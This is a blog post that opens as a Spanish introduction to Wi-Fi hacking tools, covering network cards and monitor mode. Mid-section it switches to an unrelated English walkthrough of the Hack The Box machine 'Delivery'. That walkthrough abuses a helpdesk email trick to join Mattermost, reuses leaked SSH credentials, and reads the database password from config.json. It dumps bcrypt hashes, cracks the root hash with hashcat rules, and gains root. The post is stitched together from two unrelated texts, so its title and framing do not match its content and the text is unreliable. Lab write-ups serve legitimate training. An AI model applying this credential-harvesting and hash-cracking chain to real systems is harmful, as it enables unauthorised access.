---
layout: single
title: Wifi Hacking 1, herramientas y conceptos
excerpt: "Este es el primer artículo sobre Wifi hacking y para introducirnos en el tema aquí expondré la herramienta principal que vamos a utilizar y los conceptos básicos que necesitaremos conocer."
date: 2022-07-04
classes: wide
header:
  teaser: 
  teaser_home_page: true
  icon:
categories:
  - Wifi-Hacking
tags:  
  - Wifi-Hacking
---

![]()

Para comenzar con este tema aquí tenéis el primer artículo en el cual vamos a ver la herramienta principal que vamos a utilizar y los conceptos básicos que necesitaremos conocer antes de empezar a tocar cosas.

## Herramienta: tarjeta de red

La herramienta principal que vamos a necesitar es una tarjeta de red, es importante que tenga la opción de modo monitor, ya que va a ser esencial para capturar y transmitir los paquetes de datos que viajan por el aire y que vamos a mandar, manipular y leer en los ataques que veremos más adelante. `IMPORTANTE: no voy a explicar como poner la tarjeta de red en modo monitor, ya que hay varios tipos de tarjetas y cada una tiene su método, por eso buscarlo vosotros en google o en youtube.` 
Es verdad que en algunos casos si estamos utilizando un ordenador de sobremesa quizás podemos usar la propia tarjeta de red que tenga el ordenador, pero por si acaso es recomendable comprar una externa de las que se conectan mediante USB.

Algunos modelos de tarjetas de red son:
-TP-LINK TL-WN722N (con estas es importante saber que hacen chanel hoppig por lo que a la hora de hacer ataques de tipo `Evil Twin Attack` puede complicarlos un poco)
-Alpha

## Conceptos basicos

The Delivery website is pretty basic, there's a link to a vhost called helpdesk.delivery.htb and a contact us section. We'll add this entry to our local host before proceeding further.

![](/assets/images/htb-writeup-delivery/website1.png)

The contact us section tells us we need an @delivery.htb email address and tells us port 8065 is a MatterMost server. MatterMost is a Slack-like collaboration platform that can be self-hosted.

![](/assets/images/htb-writeup-delivery/website2.png)

Browsing to port 8065 we get the MatterMost login page but we don't have credentials yet

![](/assets/images/htb-writeup-delivery/mm1.png)

## Helpdesk

The Helpdesk page uses the OsTicket web application. It allows users to create and view the status of ticket.

![](/assets/images/htb-writeup-delivery/helpdesk3.png)

We can still open new tickets even if we only have a guest user.

![](/assets/images/htb-writeup-delivery/helpdesk1.png)

After a ticket has been created, the system generates a random @delivery.htb email account with the ticket ID.

![](/assets/images/htb-writeup-delivery/helpdesk2.png)

Now that we have an email account we can create a MatterMost account.

![](/assets/images/htb-writeup-delivery/mm2.png)

A confirmation email is then sent to our ticket status inbox.

![](/assets/images/htb-writeup-delivery/mm3.png)

We use the check ticket function on the OsTicket application and submit the original email address we used when creating the ticket and the ticket ID.

![](/assets/images/htb-writeup-delivery/mm4.png)

We're now logged in and we see that the MatterMost confirmation email has been added to the ticket information.

![](/assets/images/htb-writeup-delivery/mm5.png)

To confirm the creation of our account we'll just copy/paste the included link into a browser new tab.

![](/assets/images/htb-writeup-delivery/mm6.png)

After logging in to MatterMost we have access to the Internal channel where we see that credentials have been posted. There's also a hint that we'll have to use a variation of the `PleaseSubscribe!` password later.

![](/assets/images/htb-writeup-delivery/mm7.png)

## User shell

With the `maildeliverer / Youve_G0t_Mail!` credentials we can SSH in and get the user flag.

![](/assets/images/htb-writeup-delivery/user.png)

## Credentials in MySQL database

After doing some recon we find the MatterMost installation directory in `/opt/mattermost`:

```
maildeliverer@Delivery:/opt/mattermost/config$ ps waux | grep -i mattermost
matterm+   741  0.2  3.3 1649596 135112 ?      Ssl  20:00   0:07 /opt/mattermost/bin/mattermost
```

The `config.json` file contains the password for the MySQL database:

```
[...]
"SqlSettings": {
        "DriverName": "mysql",
        "DataSource": "mmuser:Crack_The_MM_Admin_PW@tcp(127.0.0.1:3306)/mattermost?charset=utf8mb4,utf8\u0026readTimeout=30s\u0026writeTimeout=30s",
[...]
```

We'll connect to the database server and poke around.

```
maildeliverer@Delivery:/$ mysql -u mmuser --password='Crack_The_MM_Admin_PW'
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 91
Server version: 10.3.27-MariaDB-0+deb10u1 Debian 10

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mattermost         |
+--------------------+
```

MatterMost user accounts are stored in the `Users` table and hashed with bcrypt. We'll save the hashes then try to crack them offline.

```
MariaDB [(none)]> use mattermost;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [mattermost]> select Username,Password from Users;
+----------------------------------+--------------------------------------------------------------+
| Username                         | Password                                                     |
+----------------------------------+--------------------------------------------------------------+
| surveybot                        |                                                              |
| c3ecacacc7b94f909d04dbfd308a9b93 | $2a$10$u5815SIBe2Fq1FZlv9S8I.VjU3zeSPBrIEg9wvpiLaS7ImuiItEiK |
| 5b785171bfb34762a933e127630c4860 | $2a$10$3m0quqyvCE8Z/R1gFcCOWO6tEj6FtqtBn8fRAXQXmaKmg.HDGpS/G |
| root                             | $2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO |
| snowscan                         | $2a$10$spHk8ZGr54VWf4kNER/IReO.I63YH9d7WaYp9wjiRswDMR.P/Q9aa |
| ff0a21fc6fc2488195e16ea854c963ee | $2a$10$RnJsISTLc9W3iUcUggl1KOG9vqADED24CQcQ8zvUm1Ir9pxS.Pduq |
| channelexport                    |                                                              |
| 9ecfb4be145d47fda0724f697f35ffaf | $2a$10$s.cLPSjAVgawGOJwB7vrqenPg2lrDtOECRtjwWahOzHfq1CoFyFqm |
+----------------------------------+--------------------------------------------------------------+
8 rows in set (0.002 sec)
```

## Cracking with rules

There was a hint earlier that some variation of `PleaseSubscribe!` is used.

I'll use hashcat for this and since I don't know the hash ID for bcrypt by heart I can find it in the help.

```
C:\bin\hashcat>hashcat --help | findstr bcrypt
   3200 | bcrypt $2*$, Blowfish (Unix)                     | Operating System
```

My go-to rules is normally one of those two ruleset:

- [https://github.com/NSAKEY/nsa-rules/blob/master/_NSAKEY.v2.dive.rule](https://github.com/NSAKEY/nsa-rules/blob/master/_NSAKEY.v2.dive.rule)
- [https://github.com/NotSoSecure/password_cracking_rules/blob/master/OneRuleToRuleThemAll.rule](https://github.com/NotSoSecure/password_cracking_rules/blob/master/OneRuleToRuleThemAll.rule)

These will perform all sort of transformations on the wordlist and we can quickly crack the password: `PleaseSubscribe!21`

```
C:\bin\hashcat>hashcat -a 0 -m 3200 -w 3 -O -r rules\_NSAKEY.v2.dive.rule hash.txt wordlist.txt
[...]
$2a$10$VM6EeymRxJ29r8Wjkr8Dtev0O.1STWb4.4ScG.anuu7v0EFJwgjjO:PleaseSubscribe!21

Session..........: hashcat
Status...........: Cracked
Hash.Name........: bcrypt $2*$, Blowfish (Unix)
[...]
```

The root password from MatterMost is the same as the local root password so we can just su to root and get the system flag.

![](/assets/images/htb-writeup-delivery/root.png)
